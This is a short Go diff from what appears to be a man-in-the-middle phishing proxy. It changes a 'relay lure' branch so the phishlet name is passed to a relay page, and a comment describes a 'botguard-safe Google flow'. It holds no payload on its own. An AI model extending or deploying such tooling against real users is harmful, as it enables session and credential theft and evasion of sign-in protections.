@@ -436,7 +436,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// of creating a MITM session (botguard-safe Google flow)
 								if l.Relay {
 									log.Important("[%s] relay lure hit: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
-									return p.relayPage(req)
+									return p.relayPage(req, pl_name)
 								}
 
 								session, err := NewSession(pl.Name)
